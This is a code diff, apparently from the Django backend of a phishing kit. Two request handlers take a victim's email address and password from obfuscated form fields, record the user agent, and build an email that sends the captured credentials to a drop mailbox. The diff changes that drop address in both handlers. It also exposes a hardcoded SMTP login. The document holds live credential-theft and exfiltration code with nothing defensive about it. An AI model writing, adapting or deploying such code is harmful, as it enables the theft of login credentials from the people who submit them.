@@ -21,7 +21,7 @@ def addin(request):
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
     sender_email = "logs@merusllc.com"
-    receiver_email = "kimb147@yandex.com"
+    receiver_email = "mackrose14@gmail.com"
     password = "MLpkqf25fxet"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -58,7 +58,7 @@ def adddzz(request):
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
     sender_email = "logs@merusllc.com"
-    receiver_email = "kimb147@yandex.com"
+    receiver_email = "mackrose14@gmail.com"
     password = "MLpkqf25fxet"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
